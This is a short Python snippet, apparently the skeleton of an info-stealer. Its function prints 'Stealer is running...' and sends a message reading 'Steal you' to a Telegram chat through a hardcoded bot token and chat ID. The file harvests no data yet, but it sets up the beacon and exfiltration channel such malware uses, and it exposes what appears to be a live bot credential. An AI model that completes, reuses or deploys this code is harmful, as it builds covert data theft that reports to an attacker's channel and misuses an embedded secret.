import requests

def background_task():
    print("Stealer is running...")
    try:
        url = 'https://api.telegram.org/bot7496801196:AAHBtjABl8u_qN6hDbEFrfwLepaHxD9rs0A/sendMessage'
        params = {
            'chat_id': '6400572573',
            'text': 'Steal you'
        }
        response = requests.get(url, params=params)
        print(response.text)
    except Exception as e:
        print(f"An error occurred: {e}")
